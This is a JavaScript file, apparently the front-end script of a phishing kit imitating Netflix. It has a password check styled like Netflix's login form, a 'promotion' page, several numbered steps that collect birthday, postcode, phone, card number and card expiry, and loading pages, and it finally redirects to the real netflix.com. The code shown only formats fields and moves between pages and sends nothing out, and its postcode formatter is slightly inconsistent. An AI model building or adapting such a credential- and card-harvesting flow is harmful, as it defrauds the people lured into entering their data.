let inputTouched = {
  email: false,
  password: false,
};

const inputEmail = document.getElementById("inputEmail");
const inputBirthday = document.getElementById("inputBirthday");
const inputCep = document.getElementById("inputCep");
const inputTelefone = document.getElementById("inputTelefone");
const inputCartao = document.getElementById("inputCartao");
const inputDataCartao = document.getElementById("inputData");
const inputPassword = document.getElementById("inputPassword");
const inputWrapperEmail = document.getElementById("input-wrapper-email");
const inputWrapperPassword = document.getElementById("input-wrapper-password");
const warningEmail = document.getElementById("warningEmail");
const warningPassword = document.getElementById("warningPassword");

function redirectPromoction() {
  window.location.href = "promocao.html";
}

function redirectStep1() {
  window.location.href = "etapa1.html";
}

function redirectStep2() {
  window.location.href = "etapa2.html";
}

function redirectStep3() {
  window.location.href = "etapa3.html";
}

function redirectStep4() {
  window.location.href = "etapa4.html";
}

function redirectStep5() {
  window.location.href = "loading.html";
}

function redirectStep6() {
  window.location.href = "loading2.html";
}

function redirectRegistro2() {
  window.location.href = "registro2.html";
}

function redirectPromocao2() {
  window.location.href = "promocao2.html";
}

function redirectNetflix() {
  window.location.href = "https://www.netflix.com/";
}

const formatInputBirthday = (input) => {
  const formattedInput = input.value.replace(/\D/g, "").substring(0, 8);
  const match = formattedInput.match(/^(\d{0,2})(\d{0,2})(\d{0,4})$/);
  if (match) {
    let formattedValue = "";
    if (match[1]) {
      formattedValue += match[1];
      if (match[1].length === 2 && input.value.length !== 3) {
        formattedValue += "/";
      }
    }
    if (match[2]) {
      formattedValue += match[2];
      if (match[2].length === 2 && input.value.length !== 5) {
        formattedValue += "/";
      }
    }
    if (match[3]) {
      formattedValue += match[3];
    }
    input.value = formattedValue;
  } else {
    input.value = formattedInput;
  }
};

inputBirthday?.addEventListener("input", (event) => {
  formatInputBirthday(event.target);
});

const formatInputCep = (input) => {
  const formattedInput = input.value.replace(/\D/g, "").substring(0, 5);
  const match = formattedInput.match(/^(\d{0,5})(\d{0,3})$/);
  if (match) {
    let formattedValue = "";
    if (match[1]) {
      formattedValue += match[1];
      if (match[1].length === 5 && input.value.length !== 6) {
        formattedValue += "";
      }
    }
    if (match[2]) {
      formattedValue += match[2];
    }
    input.value = formattedValue;
  } else {
    input.value = formattedInput;
  }
};

inputCep?.addEventListener("input", (event) => {
  formatInputCep(event.target);
});

const formatInputCartao = (input) => {
  const formattedInput = input.value.replace(/\D/g, "").substring(0, 16);
  const match = formattedInput.match(/^(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})$/);
  if (match) {
    let formattedValue = "";
    if (match[1]) {
      formattedValue += match[1];
      if (match[1].length === 4 && input.value.length !== 5) {
        formattedValue += " ";
      }
    }
    if (match[2]) {
      formattedValue += match[2];
      if (match[2].length === 4 && input.value.length !== 10) {
        formattedValue += " ";
      }
    }
    if (match[3]) {
      formattedValue += match[3];
      if (match[3].length === 4 && input.value.length !== 15) {
        formattedValue += " ";
      }
    }
    if (match[4]) {
      formattedValue += match[4];
    }
    input.value = formattedValue;
  } else {
    input.value = formattedInput;
  }
};

inputCartao?.addEventListener("input", (event) => {
  formatInputCartao(event.target);
});

const formatInputTelefone = (input) => {
  let formattedInput = input.value.replace(/\D/g, "");
  formattedInput = formattedInput.substring(0, 15);
  input.value = formattedInput;
};

inputTelefone?.addEventListener("input", (event) => {
  formatInputTelefone(event.target);
});

const formatInputDataCartao = (input) => {
  const formattedInput = input.value.replace(/\D/g, "").substring(0, 6);
  const match = formattedInput.match(/^(\d{0,2})(\d{0,4})$/);
  if (match) {
    let formattedValue = "";
    if (match[1]) {
      formattedValue += match[1];
      if (match[1].length === 2 && input.value.length !== 3) {
        formattedValue += "/";
      }
    }
    if (match[2]) {
      formattedValue += match[2];
    }
    input.value = formattedValue;
  } else {
    input.value = formattedInput;
  }
};

inputDataCartao?.addEventListener("input", (event) => {
  formatInputDataCartao(event.target);
});

const inputOnBlur = (ev) => {
  if (inputTouched.email) {
    if (!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value)) {
      warningEmail.style.display = "block";
      inputEmail.style.borderBottom = "2px solid #e87c03";
    } else {
      warningEmail.style.display = "none";
      inputEmail.style.borderBottom = "none";
    }
  }
  if (inputTouched.password) {
    if (
      !(inputPassword.value.length >= 4 && inputPassword.value.length <= 60)
    ) {
      warningPassword.style.display = "block";
      inputPassword.style.borderBottom = "2px solid #e87c03";
    } else {
      warningPassword.style.display = "none";
      inputPassword.style.borderBottom = "none";
    }
  }
};

const inputOnFocus = (ev) => {
  inputTouched[ev.name] = true;
};

const validateEmail = (email) => {
  const re =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(String(email).toLowerCase());
};

const validatePhone = (telefone) => {
  const re = /^[0-9]{9}$/;
  return re.test(telefone);
};